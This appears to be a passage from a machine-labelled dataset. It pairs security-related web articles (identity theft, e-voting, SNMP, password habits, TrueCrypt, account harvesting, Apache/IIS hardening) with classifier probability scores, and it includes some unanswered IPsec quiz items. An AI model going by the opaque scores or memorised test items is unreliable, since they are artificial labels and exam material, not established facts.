give out your children's Social Security number when it's absolutely necessary, and provide alternate verification whenever possible. * Teach your children to never reveal personal information to anyone, no matter how trustworthy that person may seem. People close to the family are often found to be perpetrators in child identity theft cases. * If your child receives pre-approved credit card offers in the mail, you may want to check in with a credit reporting agency or Social Security. If you've been contacted by a collection agency regarding an account in your child's name, there's a possibility your child's identity was stolen. * Consider signing up your family members for a credit monitoring and identity protection solution such as the Equifax Complete(TM) Family Plan , which can help to protect two adults and up to four minor children. With this product, you will be notified of any changes or suspicious activity on your adult credit files; in addition, you can monitor your minor child's identifying information for existence of an Equifax credit file and lock it, thereby preventing creditors from accessing this file while the child is enrolled in the plan. By taking a few extra precautions to protect your children's identities, you can help ensure they get off on the right foot as they become adults and begin establishing their own credit histories.",
        "prob": "tensor([[2.0404e-06, 1.0000e+00]])"
    },
    {
        "text": "California's secretary of state, Debra Bowen, believes that open-source software should be used in elections involving electronic voting machines, to protect against error and fraud. Speaking in Cambridge, MA, [on Thursday] during a panel discussion at the EmTech organized by Technology Review, Bowen noted that individual counties are currently responsible for purchasing voting machines. Often the choice is left up to an IT professional who may lack detailed knowledge of cryptography and computer security. But the biggest concern, according to Bowen, is a lack of access to the machines' underlying code. \"Many times, a person has no legal right to review the software, even if they could,\" she said. Bowen has a history of pushing for greater transparency and accountability in election technology. After taking office in November 2006, she commissioned a top-to-bottom review of e-voting systems, including detailed analyses of source code, documentation, security, and usability. \"All of the systems had security issues,\" Bowen said. The study revealed a variety of problems, from software vulnerabilities that could let an attacker install malicious software that changes the outcome of a vote, to opportunities to tamper with the devices while they are held in storage. E-voting companies are working to address these problems, but Bowen is still frustrated that the software running on voting machines is proprietary. When asked about future elections, Bowen said the one technology she'd like to see integrated into voting systems tomorrow is open-source software for creating ballots and tabulating votes. Both tasks are horrendously complicated, she added, and so need to be very carefully monitored. For example, Los Angeles County alone may use 330 different ballots for a single election, because dozens of local races may be going on in different neighborhoods. And one common problem there with early deployments of touch-screen voting machines was that voters were presented with ballots that didn't show all the races that applied to them. Tabulating votes is also problematic. Votes arrive through a variety of channels, via mail as well as polling stations, and must be tabulated quickly and accurately. But there is little regulation or oversight of the way existing software does this. \"A lot of the concern comes out of the fact that no one can look at the software,\" Bowen says. She notes that voting-machine analysis often has to be performed under a nondisclosure agreement, meaning that the details of some flaws remain undisclosed. MIT computer science professor Ron Rivest, who has studied the security and privacy of voting systems, says that these systems should be designed to work even if the software underneath is somehow flawed. \"Do you have to trust the software in order to trust the election results?\" he asks. The ideal situation, Rivest says, is one where the presence of bugs or malware cannot affect the outcome of an election.",
        "prob": "tensor([[2.0023e-06, 1.0000e+00]])"
    },
    {
        "text": "SNMP is a simple protocol that can be used on just about any networking device in use today. In some environments it’s used heavily, in others it’s scarce. Some view it as a security threat; others see it as a way to efficiently manage some of their key systems. The SNMP protocol was designed to provide a \"simple\" method of centralizing the management of TCP/IP-based networks – plain and simple. If you want to manage devices from a central location, the SNMP protocol is what facilitates the transfer of data from the client portion of the equation (the device you are monitoring) to the server portion where the data is centralized in logs for centralized viewing and analysis. SNMP design is pretty simple. There are two main players in SNMP. The manager and the agent. The manager is generally the ‘main’ station such as HP Openview. The agent would be the SNMP software running on a client system you are trying to monitor. The manager is usually a software program running on a workstation or larger computer that communicates with agent processes that run on each device being monitored. Agents can be found on switches, firewalls, servers, wireless access points, routers, hubs, and even users' workstations – the list goes on and on. As seen in the illustration, the manager polls the agents making requests for information, and the agents respond when asked with the information requested. The types of data the agent and manager exchange are defined by a database called the management information base (MIB).The MIB is a virtual information store. It is a small database of information and it resides on the agent. Information collected by the agent is stored in the MIB. The MIB is precisely defined; the current Internet standard MIB contains more than a thousand objects. Each object in the MIB represents some specific entity on the managed device.",
        "prob": "tensor([[9.3975e-04, 9.9906e-01]])"
    },
    {
        "text": "The U.S. intelligence community on Tuesday unveiled its own secretive version of Wikipedia, saying the popular online encyclopedia format known for its openness is key to the future of American espionage. The office of U.S. intelligence czar John Negroponte announced Intellipedia, which allows intelligence analysts and other officials to collaboratively add and edit content on the government’s classified Intelink Web much like its more famous namesake on the World Wide Web. A “top secret” Intellipedia system, currently available to the 16 agencies that make up the U.S. intelligence community, has grown to more than 28,000 pages and 3,600 registered users since its introduction on April 17. Less restrictive versions exist for “secret” and “sensitive but unclassified” material. The system is also available to the Transportation Security Administration and national laboratories. Intellipedia is currently being used to assemble a major intelligence report, known as a national intelligence estimate, on Nigeria as well as the State Department’s annual country reports on terrorism, officials said. Some day it may also be the path intelligence officials take to produce the president’s daily intelligence briefing. But the system, which makes data available to thousands of users who would not see it otherwise, has also stirred qualms about potential security lapses following the recent media leak of a national intelligence estimate that caused a political uproar by identifying Iraq as a contributor to the growth of global terrorism. “We’re taking a risk,” acknowledged Michael Wertheimer, the intelligence community’s chief technical officer. “There’s a risk it’s going to show up in the media, that it’ll be leaked.” Intelligence officials say the format is perfect for sharing information between agencies, a centerpiece of the reform legislation that established Negroponte’s office as national intelligence director after the September 11 attacks. They also said it could lead to more accurate intelligence reports because the system allows a wider range of officials to scrutinize material and keeps a complete, permanent record of individual contributions including dissenting points of view. That might help avoid errors of the kind that led to the widely criticized 2002 national intelligence estimate that said Saddam Hussein possessed large stockpiles of weapons of mass destruction. Intelligence officials are so enthusiastic about Intellipedia that they plan to provide access to Britain, Canada and Australia. Even China could be granted access to help produce an unclassified intelligence estimate on the worldwide threat posed by infectious diseases. “We’d hope to get down to the doctor in Shanghai who may have a useful contribution on avian flu,” senior intelligence analyst Fred Hassani said. |copyright © 2006 Reuters. All rights reserved.|",
        "prob": "tensor([[2.2032e-04, 9.9978e-01]])"
    },
    {
        "text": "1. What two protocols provide data authentication and integrity for IPsec? (Choose two.) 2. After conducting research to learn about common remote connection options for teleworkers, a network administrator has decided to implement remote access over broadband to establish VPN connections over the public Internet. What is the result of this solution? A reliable connection is established at greater speeds than what is offered from dialup over POTS. Security is increased, but username and password information are sent in plain text. The connection has increased security and reliable connectivity. Users need a remote VPN router or VPN client software. Security and reliability are increased at a substantial loss in throughput, which is considered acceptable when supporting a single user environment. Reliability and security are increased without the need for additional equipment, when compared to dialup connections using POTS. 3. A company is using WiMAX to provide access for teleworkers. What home equipment must the company provide at the teleworker’s site? a WiMAX tower a one-way multicast satellite a WiMAX receiver an access point connected to the company WLAN",
        "prob": "tensor([[1.3487e-04, 9.9987e-01]])"
    },
    {
        "text": "Do you know the most common password in the business world? If you do, that's the problem. Lots of other people also know or can guess: It's Password1. That bit of confirming wisdom is contained in the 2012 Global Security Report from security firm Trustwave, released last month. The report, built on data from 2,000 vulnerability scans at client companies and 300 recent investigations into security breaches, highlights key data security risk areas and trends -- and one of the ongoing ones is selection of an insufficiently obscure and complex password. Satisfies Active Directory The most common way of breaking into protected computers or networks is by guessing the password. Password1, in that exact form, satisfies the conditions that are required by Microsoft 's Active Directory, in that it has a capital letter, a number, and a sufficient number of characters. While Password1 is the most common single password, some variation on the word 'password' accounts for about 5 percent of all passwords. The next most popular, accounting for about 1 percent, is the word 'welcome.' Trustwave used several commonly available password-cracking tools on some of its clients' systems. Out of 2.5 million passwords, it was able to figure out about 10 percent of them. Trustwave puts the blame not only on employees, but also on businesses, since they allow employees and system administrators to use weak passwords. The company's Global Security Report also focused on some other data security-related trends. For instance, a new target for hackers is franchises, with more than a third of data security investigations last year involving franchise businesses. One of the reasons that franchises have become popular targets, according to the report, is because the same IT systems are used across multiple stores, providing a larger payoff once that system is broken. A key trend cited in the report is a targeting of consumer records, with nearly 90 percent of all attacks intended to acquire personal, confidential information, including credit card data. The food and beverage industry is the top target of cybercriminals, for the second year running. Investigations into data breaches are also rising. Trustwave said that it conducted 42 percent more investigations last year than in 2010, in 18 countries. The company said the increase was due to \"targeted, sophisticated attacks resulting in breaches,\" as well as more Asia-Pacific region investigations. The most likely time for a malicious e-mail attachment to be sent? According to the report, it's between 8 a.m. and 9 a.m. Eastern time in the U.S. The report also found that the ability or inclination of companies to detect security breaches declined in 2011, with only 16 percent of attacked companies able to determine by themselves that they had been compromised. The other 84 percent had to rely on external information from a regulator, law enforcement or the public. Businesses that had to rely on external information gave the attackers an average of 173.5 days to enjoy that target company's environment without detection.",
        "prob": "tensor([[2.1337e-06, 1.0000e+00]])"
    },
    {
        "text": "An extension to the HTTP protocol to support sending data securely over the World Wide Web. Not all Web browsers and servers support S-HTTP. Another technology for transmitting secure communications over the World Wide Web -- Secure Sockets Layer (SSL) -- is more prevalent. However, SSL and S-HTTP have very different designs and goals so it is possible to use the two protocols together. Whereas SSL is designed to establish a secure connection between two computers, S-HTTP is designed to send individual messages securely. Both protocols have been submitted to the Internet Engineering Task Force (IETF) for approval as a standard. S-HTTP was developed by Enterprise Integration Technologies (EIT), which was acquired by Verifone, Inc. in 1995. Featured Partners Sponsored - Increase worker productivity, enhance data security, and enjoy greater energy savings. Find out how. Download the “Ultimate Desktop Simplicity Kit” now.» - Find out which 10 hardware additions will help you maintain excellent service and outstanding security for you and your customers. » - Server virtualization is growing in popularity, but the technology for securing it lags. To protect your virtual network.» - Before you implement a private cloud, find out what you need to know about automated delivery, virtual sprawl, and more. »",
        "prob": "tensor([[4.3443e-06, 1.0000e+00]])"
    },
    {
        "text": "Helping people with computers... one answer at a time. Keeping data on your computer secure is important. Being able to password protect a folder seems an obvious approach. Unfortunately it's not that simple. Can I put a password on a folder so that only I can see its contents? Yes and no. You can do something similar to password protecting it using Windows security features. It depends, though, on using the computer the \"right\" way. On top of that, I actually don't really recommend it. If you have something that you want to password protect and keep secure, I recommend a slightly different approach. Windows allows you to place restrictions on who can do what with a folder, or even a file. In Windows Explorer, right click on a folder and Properties, and then click on the Security tab: Here you can see the properties of a folder on my machine called \"books\". Here you can control who has access to that folder. The default way my machine is set up, everyone can examine the contents of that folder. I can remove that and further restrict on an account-by-account basis which users can access that folder, and whether they can modify, read or even see the folder contents. It's actually very powerful, if a tad complex. However, it's based on Windows user accounts. Thus if you give your own account full access to the file, as I assume you would, then anyone that can login to the machine as you can immediately access the file. There's no real password on the folder, it's your ability to login to Windows using your login password that controls your access to the file. And since it's based on Windows user accounts it assumes you're actually using different user accounts for different people. It's very common for that not to be the case. The approach I prefer, and in fact use myself, is to use the free open-source tool TrueCrypt. With TrueCrypt, you create a single file on your computer's hard drive that is encrypted. If someone looks at that file all they see is random data - there's no way to know what that file contains. Once you \"mount\" that file using TrueCrypt, and supply the correct password or pass-phrase to unlock it, the contents of that file appear as another drive on your system. For example, I might have a file \"c:\\Windows\\secretstuff.tc\". There's nothing you can do with that file without TrueCrypt and the password to the file. Since I know the password, I can mount it using TrueCrypt and suddenly a new drive appears - say \"P:\". That drive then contains all my protected files. I can change them, update them, delete them - whatever. Once I'm done, I can hide them all again by simply unmounting the TrueCrypt drive. It's both simple and elegant. And it's not tied to Windows, user accounts or anything else. In fact, you can copy your encrypted file to another machine entirely and mount it with TrueCrypt. Even using other systems such as Linux. And while any encryption is vulnerable if you pick a bad password, the actual encryption algorithms used by TrueCrypt are \"industrial strength\" and nearly impossible to crack with current technologies.",
        "prob": "tensor([[2.0362e-06, 1.0000e+00]])"
    },
    {
        "text": "updated Jan 27, 2009 12:07 pm | 4,375 views The term \"account harvesting\" refers to the attacking technique or activities of grabbing legitimate user IDs and even passwords to gain access to target systems for illegal or malicious purposes. The term account harvesting refers to the attacking technique or activities of grabbing legitimate user IDs and even passwords to gain access to target systems for illegal or malicious purposes. Javvin Technologies Account Harvesting is the process of collecting all the legitimate account names on a system. Sniffing software is often used to harvest accounts. Account Harvesting is often used to refer to computer spammers, individuals who try to sell or seduce others through email advertising or solicitation. Account harvesting involves using computer programs to search areas on the Internet in order to gather lists of email addresses from a number of sources, including chat rooms, domain names, instant message users, message boards, news groups, online directories for Web pages, Web pages, and other online destinations. Account harvesting is a type of authentication attacks. It usually works out for applications that respond differently to a login request with an incorrect user ID and/or an incorrect password. Different reponses from the server to valid versus invalid authentication requests may allow the valid accounts on the system to be guessed and harvested. It is noteworthy that different login error messages may sometimes be intentional - simply to let legal users know immediately what login information is wrong. However, the difference in the application response provides the attacker with significant hints to the correct account information. Difference in the application response may be classified into the following: COMMON DEFENSIVE MEASURES Here are some common defensive measures against account harvesting: Ensure that consistent error messages are utilized for account-relevant requests with multiple outcomes (e.g., incorrect user id and/or incorrect password); To defend against the enumeration of valid accounts, use generic messages like \"Login Invalid\". Ensure that the accompanying information items listed below are consistent for different account-relevant error messages: Ensure that error messages are returned in approximately the same time. It is also an option to set a random wait time for all responses to conceal the timing details from the attacker. Accounts can be locked out temporarily when account harvesting is detected. The attack can be considerably slowed down by the required additional information to access the secret question for a valid account. The additional information can be the birthdate of the user's mother, the combinition of the user's and his wife's birth years, last six of the user's SSN or some numbers on a credit card. without providing the additional information, the access to the selected secret question of an account should not be allowed. Monitor and analyze login logs via application intelligence for suspicious login patterns. Such patterns may cover a series of login failures across a list of accounts, a series of login failures across a single account, and a series of login failures for invalid accounts. That will help to detect account harvesting attempts. Most of account cracking tools, key-stroke loggers, packet sniffer tools, packet capture utilities, rootkits and Trojan login programs can be leveraged for account harvesting. Related White Papers and Webcasts Disclaimer: IT Wiki is a service that allows content to be created and edited by anyone in the community. Content posted to this site is not reviewed for correctness and is not supported by Toolbox.com or any of its partners. If you feel a wiki article is inappropriate, you can either correct it by clicking \"Edit\" above or click here to notify Toolbox.com.",
        "prob": "tensor([[0.0043, 0.9957]])"
    },
    {
        "text": "Over the years, the term malware has been used to describe any type of malicious software, including viruses, Trojan horses, worms, spyware, scareware, and adware. In the early days of computers, malware was considered more a prank used to annoy people through destructive behavior or to show off programming skills. Basically, the more people your malicious program could infect, the greater your status in certain circles. The malicious programs were often delivered to their intended victims as email attachments, shared through removable storage media or through file-sharing services. Although malware of this sort caused a wealth of problems for its victims, the driving force behind it did not motivate as many people to get involved because the payoff wasn't as lucrative to a wide base. Today, the driving force behind malware has shifted to money. Because these attacks are driven by financial rewards, there is more malware in the wild than ever before. Not only are more people involved in the creation and distribution of malware, but the attacks have grown more sophisticated. Cyber-criminals have learned how to use malware to turn large profits by: - Displaying and clicking ads - Stealing confidential data - Hijacking user sessions - Compromising user login credentials - Stealing financial information - Making fraudulent purchases - Creating spam - Launching denial-of-service attacks To deliver their malicious software to as many victims as possible, cyber-criminals have turned to websites as one of their primary sources of distribution. People have learned not to download files attached to emails, and they have stayed away from popular file-sharing services because so many files are infected with malware. One thing that people have not stopped doing, though, is surfing the Web. According to Internet World Stats (see Resources for a link), in 2011 there were 2,279,709,629 active Internet users, and that number continues to grow. With an attack landscape this large and with so many users not being suspicious, it's no wonder that websites have become the favorite media used to infect users with malware. In fact, malicious websites have become so prevalent that Google blacklists roughly 6,000 websites every day because they carry some sort of malicious software that is dangerous to visitors. Those responsible for infecting websites with malware do so in one of three ways: - They create a malicious website of their own. - They exploit a vulnerability on the web server or in its configuration. - They exploit a vulnerability in the applications the website relies on. Because this article focuses on what you can do to prevent your websites from falling victim to these attacks, I address only the latter two methods. After an attacker has found a vulnerability that he or she can successfully exploit, the attacker needs to determine how he or she will deliver malware to the website's visitors. Table 1 lists some of the common methods. Table 1. Common ways websites distribute malware |Downloads||The user is tricked into downloading the malicious code. A common tactic used is to tell the visitor that he or she needs to update multimedia software to view a video, or a victim is tricked into downloading a PDF or other type of file that actually contains malware.| |Banner ads||Users are tricked into downloading malicious files when they click infected ads that appear on the website.| In addressing server-based vulnerabilities, I look at two of the more popular web server applications on the market: Apache and Microsoft® Internet Information Services (IIS). These two servers power 78.65 percent of all websites. Both Apache and IIS—or any other web server—have vulnerabilities that malicious attackers can exploit. When attackers are able to compromise the server software or the server itself, they are able to upload malicious code or even entire web pages that deliver malware to the site's visitors. Examples of vulnerabilities that allow this type of attack to take place come from two primary sources. When web server software is installed, the default configuration is usually set up to make publishing a website easy, not secure. Unnecessary modules and services may also be part of a web server's default installation. These extras may give an attacker unrestricted access to your website's files. Each operating system, web server software, and version has unique vulnerabilities that can be found with a simple web search. Before a website goes live, any known vulnerabilities should be addressed. This source encompasses all aspects of user authentication and the management of active sessions. According to the Open Web Application Security Project (OWASP), \"A wide array of account and session management flaws can result in the compromise of user or system administration accounts. Development teams frequently underestimate the complexity of designing an authentication and session management scheme that adequately protects credentials in all aspects of the site.\" To mitigate against this type of vulnerability, those responsible for the administration of the web server and site need to adhere to password policies that determine the strength, storage, and change controls of all passwords. Furthermore, remote management capabilities for the web server should be secured or even turned off so that user credentials are not compromised through transit. If websites were still static text and images, it would be much more difficult for the bad guys to use a legitimate website to serve up malicious software. However, today's websites are powered by databases, complex code, and third-party applications that make the user experience much richer while opening the site to any number of vulnerabilities. Take WordPress, for example. This blogging application has changed how websites are created by making it easy for anyone with a bit of technical knowledge to create a multimedia-rich, interactive website. It is so popular that it powers more than 50 million websites. WordPress's ease of use, however, was also the cause of a recent outbreak, in which between 30,000 and 100,000 sites running the application redirected victims to malicious sites. Sites that installed a particular plug-in found their pages infected with code that redirected visitors to another site. This site would then infect the victim's computer with malware based on the operating system and applications that the computer was running. The Flashback Trojan that infected more than 500,000 Macs was one of the malicious programs that spread through this exploit. Examples like this are not limited to WordPress, however. Applications like Joomla!, Drupal, MediaWiki, Magento, Zen Cart, and many others have all had vulnerabilities in them that allow malicious hackers to upload malware to these sites to be distributed to visitors. For attackers to exploit a web application, they must find some type of vulnerability. Unfortunately for the owners of websites, there are so many different types of known vulnerabilities that they can't all be listed here. Some you may be familiar with, however: - Cross-site scripting (XSS) - Structured Query Language injections - Cross-site request forgery injections - URL redirects - Code execution - Cookie manipulation And the list goes on. Fortunately, there are ways to find out if your site is vulnerable to any of the known exploits by using web application-penetration techniques. By thoroughly testing a website for known vulnerabilities, you can address these threats before an attack is able to manipulate them to distribute malware to your visitors. You can do so using a variety of open source or commercial tools, or you can outsource the service to companies that specialize in this. Although penetration testing will help identify problems that need to be fixed in your website's code, web application firewalls can help stop threats before they reach your site. By identifying known attack patterns, you can thwart the efforts of malicious hackers before they are able to cause damage to your site. More advanced web application firewalls can even provide protection against unknown, zero-day threats by identifying illicit traffic. Whenever a server is configured, it is a best practice to install only the modules and applications that are necessary. By now, this is not only a best practice but a common practice. There are other basic steps that you should take to limit the vulnerabilities that exist in Apache's web server. Throughout the course of this article, I use the commands relevant to the Ubuntu distribution of Linux®. For Apache running on other operating systems or distributions, simply search for the steps required to perform each task. By default, Apache shows its name and version number upon a web request, announcing to any potential attackers what exactly the website is running. Disabling that banner makes it more difficult to pinpoint any other vulnerabilities. You can do so by navigating to /etc/apache2/apache2.conf and disabling the Another default is the ability to print a list of files found in the web site directories. This feature lets an attacker map your server and identify potentially vulnerable files. To mitigate against this issue, you need to disable the autoindex module. Simply open the terminal and use the following commands: rm -f /etc/apache2/mods-enabled/autoindex.load rm -f /etc/apache2/mods-enabled/autoindex.conf Web-based Distributed Authoring and Versioning (WebDAV) is the file-access protocol of HTTP that allows for the uploading, downloading, and changing of file contents on a website. In any production website, WebDAV should be disabled so that an attacker cannot change your files to upload malicious code. Using the terminal, you disable the dav, dav_fs, and dav_lock files by removing them with the following: rm -f /etc/apache2/mods-enabled/dav.load rm -f /etc/apache2/mods-enabled/dav_fs.conf rm -f /etc/apache2/mods-enabled/dav_fs.load rm -f /etc/apache2/mods-enabled/dav_lock.load request can be tricked into printing session cookies and this information used to hijack a user session to launch an XSS attack. You can disable this trace by navigating to the /etc/apache2/apache2.conf file and making sure that One thing that makes Windows Server® products so attractive to the consumer market is their ease of installation. Using IIS, a company can get a web server up and running with a few clicks. When the server software is installed out of the box, there is little need for configuration: It's done for you. To address security issues in its web server product, Microsoft has made significant changes to how IIS is configured and what is installed by default. There are, however, some steps that you can take to better protect against threats. Code Red and Nimda were both worms that attacked the Windows Server operating system, and both did a great deal of damage. Without adequate antimalware protection on the host operating system itself, a website quickly becomes vulnerable to attack. Using keystroke loggers, Trojans, and other malware, attackers can not only easily compromise the web administrator's login credentials, but they also have the ability to insert malicious code into the files that are served up to people visiting the site. After antimalware software is installed, it should be immediately updated and then run before any website files are uploaded. If anything is found, all passwords should immediately be changed. Before a web server running IIS goes live, be sure to update the operating system software and web server software with the latest updates from Microsoft. These updates usually contain patches that address vulnerabilities specific to Microsoft products. When a website is guilty of causing harm to its visitors, you must take steps immediately. To begin with, take down and quarantine your site. If you need to have your site up and running so as to avoid interrupting your business, rely on a backup that is verified malware free. When your web presence is taken care of, it's time to clean the infected files. Some infections require only the removal of a few lines of code, while more sophisticated attacks might require that you rewrite the entire file. Whatever steps are necessary to remove malware from a site need to be taken at this point. When Google and the other search engines find a site that is serving malware, they can pull it from their results. This can have devastating effects on a business. After all malware has been removed and any vulnerabilities patched, submit the site to the search engines for review. If they determine that it is no longer a threat to any visitors, the website can be re-listed and traffic from the search engine can be restored. If the malware infection has compromised user account information, all users should be notified immediately so that they can deal with any ramifications. In addition, an organization will need to see whether any laws or regulations have been violated as a result of the breach and take appropriate measures to mitigate any negative effects and keep them in compliance. In a report by Dasient, approximately 1.1 million websites were found to have some type of malware in the fourth quarter of 2010. Other studies show that 85 percent of all malware comes from the Web. Now, it would be easy to write this off if the sites that were causing all the problems had a malicious intent from the beginning. Unfortunately, it is the small business website, the church website, or even the well-respected news website that is responsible for infecting so many computers. The responsibility for protecting websites against attack is falling on the shoulders of the web developer. The days of sitting back and writing awesome code are over. Now, the developer needs to make sure that his or her code is functional and secure. The techniques listed in this article will certainly help the developer who doesn't understand web site security build a foundation for his or her knowledge, but it shouldn't stop here. The threat landscape changes daily. As zero-day exploits emerge and cyber-criminals adapt to countermeasures, web developers too need to adapt and be on the lookout for how they can better secure their sites. Internet World Stats: Find more Internet statistics. Google blacklists: Read more about why Google blacklists roughly 6,000 websites every day. Prevalence of Apache and IIS: According to Netcraft, Apache and IIS power 78.65 percent of all websites. WordPress: Read more about the prevalence of WordPress. \"Hardening the Linux server:\" Learn how to harden your Linux server (developerWorks, December 2008). OWASP Top Ten Web Application Security Threats: Learn more about OWASP and its work. Web development zone: Find resources for Web 2.0, Ajax, wikis, PHP, mashups, and other web projects. developerWorks technical events and webcasts: Stay current with technology in these sessions. developerWorks on Twitter: Join today to follow developerWorks tweets. developerWorks podcasts: Listen to interesting interviews and discussions for software developers. developerWorks on-demand demos: Watch demos ranging from product installation and setup for beginners to advanced functionality for experienced developers. Get products and technologies IBM product evaluation versions: Download or explore the online trials in the IBM SOA Sandbox and get your hands on application development tools and middleware products from DB2®, Lotus®, Rational®, Tivoli®, and WebSphere.® : Connect with other developerWorks users while exploring the developer-driven blogs, forums, groups, and wikis. Jeff Orloff is a freelance technology writer who also works as a technology coordinator with the School District of Palm Beach County, Florida. Throughout his career, he has worked with web technologies, specializing in security. He has served as the director of technology for SafeWave, as a security evangelist for Applicure Technologies, and as the editor of Developer Drive, a blog dedicated to website development tutorials.",
        "prob": "tensor([[2.1510e-06, 1.0000e+00]])"
    },
    {
        "text": "David E. Evans Assistant Professor of Computer Science School of Engineering and Applied Science What Biology Can Teach Us About Computer Security Witty Worm. Code-Red. Nimda. Sapphire/Slammer SQL. Their names are curious, engaging, almost comical, but computer worms and other viruses are no laughing matter. Viruses and other malicious software cost businesses billions each year, and cause users hours of frustration. Part of the problem is that modern viruses spread so quickly, the old ways of combating them are no longer effective. Machines are highly connected, and the Internet is open to everyone, so malicious code can spread remarkably quickly. 2003, the Cooperative Association for Internet Data Analysis reported that the Sapphire/Slammer SQL worm spread worldwide in only 10 minutes, and at its peak — three minutes after its release — scanned the Internet at more than 55 million addresses per second. Researchers have speculated that a well-designed worm could infect all vulnerable machines on the Internet within a few hours of its launch. The problem with our current methods of fighting computer virus attacks is that we cannot cope with unfamiliar enemies. Computer antivirus software recognizes the signatures of known viruses, and gets rid of them. But it can’t get rid of a virus that it hasn’t seen before. Human intervention is needed to identify and analyze the attack code, create a signature for detecting it, and update anti-virus software to recognize and prevent the new attack. effective defenses must be able to defend systems from attacks that do not Consider the way in which the human immune system works. Viruses and bacteria attack their human hosts. The human immune system responds by isolating and attacking the foreign bodies. It does this, responding to unfamiliar things, what is familiar and concluding that what is not familiar is foreign and must be eliminated. Unlike computer anti-virus software that recognizes of known viruses, the human immune system is able to recognize and destroy previously unknown viruses. Computer systems, however, suffer from a lack of diversity. Nearly all computers on the Internet run the same operating systems and applications. Without diversity, systems all are vulnerable to the same attacks. A monoculture enables people to share programs and data, but means attacks can be shared in the same way. Researchers are beginning to develop ways to build systems that are diverse as far as attackers are concerned, but still appear the same for legitimate users. DARPA, the Defense Advanced Research Project Agency, is funding research to develop technologies for computer systems that provide critical functions even while under attack. The projects funded under this new initiative include a $1 million contract to researchers at the University of Virginia and Carnegie Mellon University to explore the idea of biologically inspired diversity as an approach to computer security. The project goal is to add an element of diversity throughout the system without changing the way users interact with it. Researchers are still grappling with the problem of how to automatically create enough diversity to foil attacks, while preserving the program behavior and performance users expect. Unlike nature, where attacks evolve, computer attacks are engineered, and sophisticated attackers can design malicious code intended to circumvent or fool defenses. As in natural selection, there is a continual arms race between those attempting to build secure computer systems, and those attempting to compromise them. For now, computer professionals are racing to keep pace with the attackers and struggling to develop specific defenses for every new attack. Before long, we hope to be able to create the computer equivalent of a broad-based antibiotic that can protect systems from any attack, known or unknown. David Evans is an assistant professor in the Department of Computer Science whose research focuses on encryption and computer security. |*All opinions on this page belong to the authors and do not necessarily reflect the opinions of the University of Virginia. All other text, images, logos and information contained on official University of Virginia Web sites are the intellectual property of U.Va. © by the Rector and Visitors of the University of Virginia Faculty Opinions site edited and maintained by Charlotte Crystal",
        "prob": "tensor([[2.0187e-06, 1.0000e+00]])"
    },
    {
        "text": "Decision-Making and the Straw Man by Rick Brenner In project work, we often make decisions with incomplete information. Sometimes we narrow the options to a few, examine their strengths and risks, and make a choice. In our deliberations, some advocates use a technique called the Straw Man fallacy. It threatens the soundness of the decision, and its use is very common. Natalie interrupted Geoff. \"I don't think that's a realistic approach at all. Even if we had the budget, we don't have time to hire thirty people.\" Geoff was now on defense. \"I never suggested that — I said that to make the scheduled date would require thirty more people. Hiring is probably the worst way to get there.\" Playing defense, Geoff's task is not only to make his original point, but also to remove the distortions that Natalie has introduced into the debate by using a technique called the Straw Man fallacy. To use Straw Man, you state your partner's position in a form that's easy to refute. Then you refute your restatement of it, often by showing that it has unacceptable implications. Most of us use Straw Man from time to time. It's so common that we rarely notice it. Here are some indicators that your partner may have used Straw Man. - A sense of frustration - Feelings of frustration during debate can arise from many possible sources, but check for Straw Man first. - Someone characterizes your position - Your partner characterizes your position, and you have little or no opportunity to critique the characterization before the process of drawing extremely undesirable inferences has begun. - Absolute language The Straw Man fallacy is so common that we rarely notice it - In the characterization of your position, nuances and qualifications are removed, and an absolutist version of your position emerges. Words like every, nobody, all, none, always, never, forever, 100%, completely, and so on are good indicators. - I never said... - If you feel the need to clarify, or to deny that you said something, there's a good chance that your partner has used Straw Man. If the user of Straw Man prevails, success might be based not on the strength of the argument, but on a distorted premise. And anything constructed on that basis is more likely to be wrong. To manage this risk, be prepared to deal with the Straw Man fallacy when it appears. - Make sure that everyone understands the Straw Man fallacy, how it works, and what it costs. - Notice characterizations - When you notice that someone's position is being characterized, speak up. Before the implications begin to flow, ask for discussion of the characterization, and gain agreement that it's fair and complete. When we use Straw Man in the decision-making context, we typically intend to eliminate something from the list of candidates so that the group will choose one of the other options. This is a setup for tragedy. If the ploy works, we will have chosen that option not by comparing it to the options we do have, but to distortions of them. And we will have built our decision on a foundation of straw. Top Next Issue For more on the Straw Man fallacy, see D. Walton, \"The Straw Man Fallacy,\" in Logic and Argumentation, J. van Bentham, et. al., ed. Amsterdam: North Holland, 1996. Available at io.uwinnipeg.ca/~walton/96straw.pdf. Are you fed up with tense, explosive meetings? Are you or a colleague the target of a bully? Destructive conflict can ruin organizations. But if we believe that all conflict is destructive, and that we can somehow eliminate conflict, or that conflict is an enemy of productivity, then we're in conflict with Conflict itself. Read 101 Tips for Managing Conflict to learn how to make peace with conflict and make it an organizational asset. Order Now! Your comments are welcome Would you like to see your comments posted here? Send me your comments by email , or by Web form About Point Lookout Thank you for reading this article. I hope you enjoyed it and found it useful, and that you'll consider recommending it to a friend Point Lookout is a free weekly email newsletter. Browse the archive of past issues. Subscribe for free. Support Point Lookout by joining the Friends of Point Lookout, as an individual or as an organization. Do you face a complex interpersonal situation? Send it in, anonymously if you like, and I'll give you my two cents. More articles on Emotions at Work - Feedback Fumbles - \"Would you like some feedback on that?\" Uh-oh, you think, absolutely not. But if you're like many of us, your response is something like, \"Sure, I'd be very interested in your thoughts.\" Why is giving and receiving feedback so difficult? - Demanding Forgiveness - Working together under stress, we do sometimes hurt each other. Delivering apologies is a skill critical to repairing those hurts and maintaining our relationships. - It's a Wonderful Day! - Most knowledge workers are problem solvers. We work towards goals. We anticipate problems as best we can, and when problems appear, we solve them. But our focus on anticipating problems can become a problem in itself — at work and in Life. - Sixteen Overload Haiku - Most of us have some experience of being overloaded and overworked. Many of us have forgotten what it is not to be overloaded. Here's a contemplation of the state of overload. - The Focusing Illusion in Organizations - The judgments we make at work, like the judgments we make elsewhere in life, are subject to human fallibility in the form of cognitive biases. One of these is the Focusing Illusion. Here are some examples to watch for. See also Emotions at Work, Effective Communication at Work, Critical Thinking and Rhetorical Fallacies for more related articles. I offer email and telephone coaching at both corporate and individual rates. Contact me for details at rbrenner@ChacoCanyon.com or (617) 491-6289, or toll-free in the continental US at (866) 378-5470. Get the ebook! Past issues of Point Lookout are available in six ebooks: Reprinting this article Are you a writer, editor or publisher on deadline? Are you looking for an article that will get people talking and get compliments flying your way? You can have 500 words in your inbox in one hour. License any article from this Web site. More info - The Race to the South Pole: Ten Lessons for Project Managers - On 14 December 1911, four men led by Roald Amundsen reached the South Pole. Thirty-five days later, Robert F. Scott and four others followed. Amundsen had won the race to the pole. Amundsen's party returned to base on 